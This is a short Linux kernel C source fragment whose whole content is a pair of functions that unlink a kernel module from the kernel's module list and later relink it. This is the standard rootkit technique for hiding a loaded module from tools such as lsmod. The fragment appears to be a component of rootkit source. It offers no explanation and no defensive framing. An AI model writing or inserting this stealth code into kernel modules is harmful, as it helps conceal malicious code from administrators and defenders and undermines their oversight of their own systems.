#include <linux/syscalls.h>

static struct list_head *prev_mod;

int hide_module(struct module* mod)
{
    prev_mod = mod->list.prev;
    list_del(&mod->list);
    return 1;
}

int show_module(struct module* mod)
{
    list_add(&mod->list,prev_mod);
    return 0;
}